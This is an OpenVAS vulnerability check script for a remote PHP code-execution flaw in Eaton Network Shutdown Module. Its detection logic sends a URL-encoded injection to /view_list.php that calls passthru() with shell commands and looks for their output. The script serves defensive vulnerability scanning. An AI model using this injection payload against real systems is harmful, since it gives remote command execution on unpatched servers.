###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eaton_network_shutdown_module_54161.nasl 11003 2018-08-16 11:08:00Z asteins $
#
# Eaton Network Shutdown Module Arbitrary PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103522");
  script_bugtraq_id(54161);
  script_version("$Revision: 11003 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Eaton Network Shutdown Module Arbitrary PHP Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54161");

  script_tag(name:"last_modification", value:"$Date: 2018-08-16 13:08:00 +0200 (Thu, 16 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-07-23 11:34:22 +0200 (Mon, 23 Jul 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 4679);
  script_mandatory_keys("Pi3Web/banner");

  script_tag(name:"summary", value:"Eaton Network Shutdown Module is prone to a remote PHP code-execution
vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary
malicious PHP code in the context of the webserver process. This may
facilitate a compromise of the application and the underlying system,
other attacks are also possible.");

  script_tag(name:"affected", value:"Network Shutdown Module 3.21 build 01 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:4679);

banner = get_http_banner(port:port);

if("Pi3Web/" >!< banner || "NSMID=" >!< banner)exit(0);

commands = exploit_commands();

foreach cmd (keys(commands)) {

  url = '/view_list.php?paneStatusListSortBy=0%22%5d)%20%26%20passthru(%22' + commands[cmd]  +  '%22)%3b%23';

  if(http_vuln_check(port:port, url:url,pattern:cmd)) {

    security_message(port:port);
    exit(0);

  }
}

exit(0);
